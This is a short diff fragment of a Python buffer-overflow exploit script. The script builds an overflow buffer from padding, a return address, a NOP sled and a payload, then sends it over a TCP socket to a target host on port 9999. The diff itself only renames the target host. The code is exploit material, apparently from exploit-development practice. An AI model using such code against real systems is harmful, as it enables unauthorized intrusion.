@@ -10,7 +10,7 @@ shellcode = b"A" * 524 + b"\xf3\x12\x17\x31" + b"\x90" * 32 + payload
 
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- s.connect(('vulnerablebox', 9999))
+ s.connect(('vulnerableboxip', 9999))
  s.send((shellcode))
  s.close()
 except:
